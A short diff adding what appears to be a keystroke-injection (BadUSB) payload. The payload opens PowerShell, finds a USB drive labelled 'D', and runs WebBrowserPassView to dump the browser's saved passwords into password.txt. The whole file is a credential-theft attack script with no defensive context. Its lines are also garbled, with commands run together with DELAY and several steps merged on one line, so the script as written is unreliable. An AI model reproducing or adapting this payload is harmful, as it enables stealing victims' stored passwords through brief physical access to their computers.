@@ -1,0 +1,7 @@
+DELAY
+DELAY
+powershellDELAY
+DELAY
+$usbPath = GET-WMIObject Win32_Volume | ? { $_.label -eq 'D' } | select nameDELAY
+DELAY
+cd $usbPath.name./WebBrowserPassView /stext password.txtexit
